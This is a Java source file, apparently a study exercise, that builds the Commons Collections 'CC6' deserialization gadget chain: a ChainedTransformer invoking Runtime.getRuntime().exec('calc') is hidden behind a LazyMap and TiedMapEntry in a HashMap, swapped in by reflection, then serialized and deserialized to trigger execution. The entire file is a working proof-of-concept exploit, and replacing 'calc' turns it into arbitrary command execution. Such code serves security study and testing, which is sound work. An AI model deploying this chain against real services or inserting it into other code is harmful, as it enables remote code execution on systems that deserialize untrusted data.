package com.drose.CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        //补充安全省略设置
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //尾部chain
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();
//        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);
        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
//        lazymap.get("Dr0se");
        //需要继续分析哪里有get()函数的调用。
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"1");
//        tiedMapEntry.hashCode();
        HashMap<Object,Object> hashMap2 = new HashMap();
        hashMap2.put(tiedMapEntry,"Dr0se");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap,chainedTransformer);
        lazymap.remove("1");
        serialize(hashMap2);
        unserialize("test.txt");
    }
    //序列化反序列化
    public static void serialize(Object obj) throws IOException, FileNotFoundException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./test.txt"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
